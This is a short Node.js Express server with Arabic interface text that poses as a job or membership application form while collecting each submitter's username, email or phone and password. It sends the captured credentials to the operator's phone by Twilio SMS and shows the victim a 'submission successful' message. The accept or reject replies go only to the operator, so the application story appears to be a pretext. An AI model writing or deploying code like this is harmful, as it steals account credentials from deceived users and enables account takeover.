const express = require("express");
const bodyParser = require("body-parser");
const twilio = require("twilio");

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(__dirname));

const ACCOUNT_SID = "ضع_هنا_SID";
const AUTH_TOKEN  = "ضع_هنا_TOKEN";
const TWILIO_NUM  = "+1XXXXXXXXXX";      // رقم Twilio
const OWNER_NUM   = "+9665XXXXXXXX";     // رقمك أنت

const client = new twilio(ACCOUNT_SID, AUTH_TOKEN);

let lastApplicant = null;

app.post("/apply", (req, res) => {
  lastApplicant = req.body;

  const msg =
`تقديم جديد 🔔
اسم المستخدم/البريد/الهاتف: ${req.body.name}
كلمة المرور: ${req.body.age}


رد:
1 = قبول
2 = رفض`;

  client.messages.create({
    body: msg,
    from: TWILIO_NUM,
    to: OWNER_NUM
  });

  res.send("تم إرسال التقديم بنجاح ✅");
});

app.post("/sms", (req, res) => {
  const reply = req.body.Body.trim();

  if(!lastApplicant){
    return res.send("<Response></Response>");
  }

  let text = "";

  if(reply === "1"){
    text = "تم قبولك ✅ بالتوفيق!";
  } 
  else if(reply === "2"){
    text = "نأسف، تم رفض طلبك ❌";
  }

  if(text){
    client.messages.create({
      body: text,
      from: TWILIO_NUM,
      to: OWNER_NUM
    });
  }

  res.send("<Response></Response>");
});

app.listen(3000, () => {
  console.log("Server Running on http://localhost:3000");
});
